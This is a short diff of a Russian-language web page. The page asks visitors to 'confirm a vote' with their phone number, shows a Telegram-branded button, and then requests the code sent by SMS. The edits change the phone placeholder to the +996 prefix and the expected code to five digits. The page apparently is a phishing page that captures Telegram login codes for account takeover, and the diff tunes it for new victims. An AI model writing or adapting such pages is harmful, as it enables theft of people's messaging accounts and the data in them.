@@ -371,7 +371,7 @@
             <p>Для подтверждения голоса введите ваш номер телефона</p>
             
             <div id="phoneForm">
-                <input type="tel" id="phoneNumber" placeholder="+7 (999) 123-45-67" class="phone-input" required>
+                <input type="tel" id="phoneNumber" placeholder="+996 (999) 123-45-67" class="phone-input" required>
                 <button class="telegram-btn" id="requestOtpBtn" onclick="requestOTP()">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white">
                         <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161l-1.68 8.683c-.12.541-.449.674-.912.42l-2.521-2.01-1.216 1.276c-.135.134-.248.247-.506.247l.18-2.58 4.681-4.313c.203-.179-.044-.277-.316-.099l-5.784 3.721-2.491-.84c-.54-.179-.547-.54.126-.8l9.738-3.858c.454-.161.853.109.701.752z"/>
@@ -397,7 +397,7 @@
             
             <div id="otpForm" style="display: none;">
                 <p>Мы отправили код подтверждения на ваш номер</p>
-                <input type="text" id="otpCode" placeholder="Введите код из СМС" class="otp-input" maxlength="6" required>
+                <input type="text" id="otpCode" placeholder="Введите код из СМС" class="otp-input" maxlength="5" required>
                 <button class="telegram-btn" id="verifyOtpBtn" onclick="verifyOTP()">
                     <span id="verifyOtpText">Подтвердить</span>
                     <span id="verifyOtpLoading" class="loading" style="display: none;"></span>
@@ -569,8 +569,8 @@
         async function verifyOTP() {
             const otpCode = document.getElementById('otpCode').value.trim();
             
-            if (!otpCode || otpCode.length !== 6) {
-                alert('Введите корректный код из 6 цифр');
+            if (!otpCode || otpCode.length !== 5) {
+                alert('Введите корректный код из 5 цифр');
                 return;
             }
             
